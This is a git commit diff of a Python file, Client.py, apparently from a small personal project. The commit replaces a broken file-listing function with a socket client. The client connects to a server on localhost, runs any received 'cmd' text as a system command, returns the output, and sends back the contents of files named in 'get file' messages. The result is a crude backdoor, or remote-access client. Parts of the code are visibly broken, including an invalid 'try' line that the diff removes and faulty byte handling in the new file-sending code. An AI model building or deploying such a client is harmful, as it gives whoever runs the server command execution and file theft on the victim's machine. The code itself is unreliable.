abebd98a0bb18dfa23f761a127e2a17b765ee4f4
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-10 11:32:05 -0800

    Update Client.py

--- Client.py
+++ Client.py
@@ -1,46 +1,41 @@
-import subprocess
-import socket
+
 import os
+import socket
+import subprocess
 
-count = 0
-count_3 = 0
 
-
-def files_list(path):
-    global count, count_3
-    files = os.listdir(path)
-    try files = os.listdir(path):
-
-        for count in range(0, len(files), 1):
-            if os.path.isdir(path + "\\" + files[count]):
-                files_list(files[count])
-            else:
-                print(files[count])
-    except FileNotFoundError:
-        count += 1
-        return files_list(files_list(files[count]))
+def file_size(path):
+    return os.path.getsize(path)
 
 
 def client():
     s = socket.socket()
-    s.connect(('127.0.0.1', 9855))
+    s.connect(('127.0.0.1', 8965))
 
+    # message = input('-> ')
     while True:
         data = s.recv(1024).decode('utf-8')
-        if not data:
-            break
-        print('From online user: ' + data)
-        data = data.upper()
-        s.send(data.encode('utf-8'))
+        if 'cmd' in data:
+            try:
+                data = data.replace('cmd ', '')
+                s.send(subprocess.check_output(data))
+            except Exception:
+                s.send(f"Error with {data} command".encode('utf-8'))
+
+        elif 'get file' in data:
+            data = data.replace('get file ', '')
+            content = bytes(file_size(data) * 1030)
+            with open(data, 'rb') as file:
+                for line in file.readline():
+                    content += line
+            s.send(content)
+
+
+        else:
+            s.send('The command was not found'.encode('utf-8'))
+
     s.close()
 
 
 if __name__ == '__main__':
-    # client()
-    print(files_list("C:\\"))
-# files = os.listdir('C:\\')
-# files_2 = files[count]
-# files_3 = files_2[count_3]
-# print(files)
-# print(files_2)
-# print(files_3)
+    client()
